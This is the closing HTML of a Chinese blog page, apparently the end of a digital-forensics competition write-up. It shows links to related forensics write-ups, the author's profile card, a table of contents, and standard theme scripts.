class="pagination-related" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E6%95%B0%E8%AF%81%E6%9D%AF/24%E6%95%B0%E8%AF%81%E6%9D%AF%E5%88%9D%E8%B5%9B%E5%9B%A2%E4%BD%93/" title="24数证杯初赛团体"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">24数证杯初赛团体</div></div><div class="info-2"><div class="info-item-1">一、手机取证1.机主微信 ID 号为？（答案按照实际填写，字母全小写） wxid_gvlyzqeyg83o22 2.机主在 2023 年 12 月登录宝塔面板使用的验证码为？（填写数字，答案格式如：1234）482762 3.小众即时...</div></div></div></a><a class="pagination-related" href="/2026/04/11/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E5%B9%B3%E8%88%AA%E6%9D%AF/2026%E5%B9%B3%E8%88%AA%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B/" title="2026平航杯团队赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-11</div><div class="info-item-2">2026平航杯团队赛</div></div><div class="info-2"><div class="info-item-1">前言：案件背景一段气，藏于硬盘之间 ，无影无形 ；二段气 ，隐于内存之中，似有还无 ；三段气 ，破于取证之下 ，水落石出！ 三十年河东三十年河西 ，莫欺平航穷！说罢，气息不再掩饰，取证人的锋芒，自此划破迷雾——各位选手，备好你的取证工...</div></div></div></a><a class="pagination-related no-desc" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81write-up/%E6%95%B0%E8%AF%81%E6%9D%AF/25%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B%E5%9B%A2%E4%BD%93/" title="25数证杯决赛团体"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-03-15</div><div class="info-item-2">25数证杯决赛团体</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">琉璃幻彩</div><div class="author-info-description">The Greatest Magician!</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">112</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">130</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/FighterGodNemo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/FighterGodNemo" title="Github" target="_blank"><i class="fab fa-github"></i></a><div class="qr-code-wrapper"><a class="social-icon" href="javascript:void(0)" title="微信"><i class="fab fa-weixin"></i></a><div class="qr-code-popup"><img src="/img/qrcode/wechat-qr.png" alt="微信二维码"/ loading='lazy'></div></div><div class="qr-code-wrapper"><a class="social-icon" href="javascript:void(0)" title="QQ"><i class="fab fa-qq"></i></a><div class="qr-code-popup"><img src="/img/qrcode/qq-qr.png" alt="QQ二维码"/ loading='lazy'></div></div><div class="copy-text-wrapper"><a class="social-icon" href="javascript:void(0)" title="Steam好友代码：1905706957" data-copy-text="1905706957"><i class="fab fa-steam"></i></a><div class="copy-text-popup"><h3>Steam好友代码</h3><p>1905706957</p><p class="copy-hint">点击图标复制</p></div></div><a class="social-icon" href="mailto:guliujia2233@outlook.com" title="Email" target="_blank"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">热爱 CTF 和 Forensic 的网安人一枚～
+欢迎各位大佬交流点评！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5"><span class="toc-number">2.</span> <span class="toc-text">解密密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BB%B6%E8%AF%A6%E6%83%85"><span class="toc-number">3.</span> <span class="toc-text">案件详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AD%A6%E6%96%B9%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">警方资料</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-%E4%B8%8E%E2%80%99%E6%9C%97%E5%B0%BC%E2%80%99%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99"><span class="toc-number">4.1.</span> <span class="toc-text">A)与’朗尼’相关的资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-%E4%B8%8E%E2%80%99AGC%E2%80%99%E9%9B%86%E5%9B%A2%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99"><span class="toc-number">4.2.</span> <span class="toc-text">B)与’AGC’集团相关的资料</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E4%B8%8E%E2%80%99%E7%8E%8B%E6%99%AF%E6%B5%A9%E2%80%99%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99"><span class="toc-number">4.3.</span> <span class="toc-text">C)与’王景浩’相关的资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%88%E6%8C%89%E9%A2%98%E5%9E%8B%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">题目（按题型）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A1%AB%E7%A9%BA%E9%A2%98"><span class="toc-number">5.1.</span> <span class="toc-text">填空题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E9%80%89%E9%A2%98"><span class="toc-number">5.2.</span> <span class="toc-text">单选题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E9%80%89%E9%A2%98"><span class="toc-number">5.3.</span> <span class="toc-text">多选题</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/Forensic%E7%9F%A5%E8%AF%86/MT%E7%AE%A1%E7%90%86%E5%99%A8%E6%9B%BF%E6%8D%A2%E5%8C%85%E6%95%B0%E6%8D%AE/" title="MT管理器替换包数据">MT管理器替换包数据</a><time datetime="2026-04-13T23:11:42.460Z" title="更新于 2026-04-14 07:11:42">2026-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/Forensic%E7%9F%A5%E8%AF%86/Cache%EF%BC%88%E7%BC%93%E5%AD%98%EF%BC%89/" title="Cache（缓存）">Cache（缓存）</a><time datetime="2026-04-13T23:11:42.459Z" title="更新于 2026-04-14 07:11:42">2026-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/Forensic%E8%A7%A3%E9%A2%98%E5%A6%99%E5%85%B7/Volatility3/" title="Volatility3">Volatility3</a><time datetime="2026-04-13T23:11:42.452Z" title="更新于 2026-04-14 07:11:42">2026-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/Forensic%E8%A7%A3%E9%A2%98%E5%A6%99%E5%85%B7/Python%E5%88%87%E6%8D%A2%E6%89%80%E7%94%A8%E7%89%88%E6%9C%AC/" title="Python切换所用版本">Python切换所用版本</a><time datetime="2026-04-13T23:11:42.451Z" title="更新于 2026-04-14 07:11:42">2026-04-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/15/Forensic_%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/Forensic%E8%A7%A3%E9%A2%98%E5%A6%99%E5%85%B7/MT%E7%AE%A1%E7%90%86%E5%99%A8%E6%9B%BF%E6%8D%A2APK%E6%95%B0%E6%8D%AE/" title="MT管理器替换APK数据">MT管理器替换APK数据</a><time datetime="2026-04-13T23:11:42.450Z" title="更新于 2026-04-14 07:11:42">2026-04-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 琉璃幻彩</span><span class="framework-info"><span id="busuanzi_container_site_pv">本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</span><span class="footer-separator">|</span><span id="busuanzi_container_site_uv">本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</span></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script src="/js/custom.js?v=20260402-2"></script><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bootcdn.net/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.staticfile.org/butterfly-extsrc/1.1.6/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.staticfile.org/pjax/0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      false
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
